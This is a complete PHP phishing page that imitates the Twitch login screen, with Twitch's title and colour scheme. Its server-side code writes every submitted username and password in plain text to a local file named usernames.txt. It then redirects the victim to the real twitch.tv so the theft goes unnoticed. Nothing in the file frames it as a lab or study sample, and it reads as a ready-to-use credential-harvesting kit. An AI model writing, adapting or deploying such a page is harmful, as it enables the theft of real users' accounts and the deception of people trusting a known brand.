<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = "username: " . $_POST['username'] . " | password: " . $_POST['password'] . "\n";
    file_put_contents("usernames.txt", $data, FILE_APPEND);
    header("Location: https://www.twitch.tv");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>Twitch – Log In</title><meta charset="UTF-8"></head>
<body style="background: #18181b; font-family: Arial, sans-serif; text-align: center; margin-top: 80px;">
<div style="width: 350px; margin: auto; padding: 40px;">
<h1 style="color: #9147ff;">Twitch</h1>
<h2 style="color: white;">Log In</h2>
<form method="post">
<input type="text" name="username" placeholder="Username or email" style="width: 90%; padding: 14px; margin: 10px 0; border: 1px solid #303035; background: #1f1f23; color: white; border-radius: 4px;" required><br>
<input type="password" name="password" placeholder="Password" style="width: 90%; padding: 14px; margin: 10px 0; border: 1px solid #303035; background: #1f1f23; color: white; border-radius: 4px;" required><br>
<button type="submit" style="background: #9147ff; color: white; width: 95%; padding: 12px; border: none; border-radius: 4px; font-weight: bold;">Log In</button>
</form>
</div>
</body>
</html>
